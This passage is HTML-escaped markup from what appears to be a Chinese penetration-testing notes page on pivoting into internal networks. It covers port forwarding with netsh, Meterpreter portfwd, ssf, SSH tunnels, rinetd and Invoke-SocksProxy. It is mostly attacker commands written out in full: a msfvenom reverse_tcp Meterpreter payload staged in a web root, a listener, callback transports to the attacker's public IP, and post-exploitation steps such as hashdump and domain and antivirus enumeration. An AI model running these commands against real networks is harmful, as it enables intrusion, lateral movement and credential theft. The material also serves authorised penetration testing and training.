src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;建立连接后，攻击机连接本机389端口即可&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;msf\&quot;&gt;msf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#msf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Meterpreter 列出活动的端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;转发目标主机的3389远程桌面服务端口到本地的5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd delete –l 3389 –p 3389 –r target-host &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd flush&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;netsh\&quot;&gt;netsh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#netsh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;当靶机某服务只允许内网访问时，将端口转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;添加防火墙规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;列出所有转发规则:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy show all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除指定的端口转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除所有转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy reset&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;ssf\&quot;&gt;ssf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;单层网络正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/securesocketfunneling/ssf/releases&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;把内网10.1.1.108的SSH转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器访问内网端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;单层网络反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ssh\&quot;&gt;ssh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;SSH基本参数&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-C 压缩传输，加快传输速度&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-f 在后台对用户名密码进行认证&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-q 安静模式，不要显示任何debug信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-l 指定ssh登录名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-g 允许远程主机连接到本地用于转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-L 进行本地端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-R 进行远程端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-D 动态转发，即socks代理&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-T 禁止分配伪终端&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-p 指定远程ssh服务端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务&lt;/li&gt;\n&lt;/ol&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;本地攻击机执行，把115的3389映射到本地的33890上&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ol start=\&quot;2\&quot;&gt;\n&lt;li&gt;方法2（上线MSF）\n** 攻击机—出网Linux靶机—不出网Linux靶机—不出网win机 **\n攻击逻辑说明：&lt;/li&gt;\n&lt;/ol&gt;\n&lt;ul&gt;\n&lt;li&gt;Windows 执行 1.exe&lt;/li&gt;\n&lt;li&gt;→ 连接 “不出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;不出网 Linux 把 12138 映射到 “出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓&lt;/li&gt;\n&lt;li&gt;攻击机 msfconsole 收到 meterpreter 会话&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;攻击机监听端口12345&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; use exploit/multi/handler&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lport 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set ExitOnSession false&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; exploit -j&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Exploit running as background job 0.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Started reverse TCP handler on 0.0.0.0:12345&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;不出网Linux机&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这样就建立连接了，然后可以这样做&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 把会话放到后台&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; background&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看/升级 transport（断网重连）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; sessions -i 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport next&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 常用其它命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; sysinfo # 系统版本 / 补丁\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; getuid # 当前用户 / 特权\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_domain #域信息\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;外网攻击107，内网靶机97&lt;/p&gt;\n&lt;p&gt;出网靶机编辑后restart ssh服务&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\nservice rinetd start&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;invoke-socksproxy\&quot;&gt;Invoke-SocksProxy&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#invoke-socksproxy\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://gitee.com/RichChigga/Invoke-SocksProxy&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Import-Module .\\Invoke-SocksProxy.psm1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 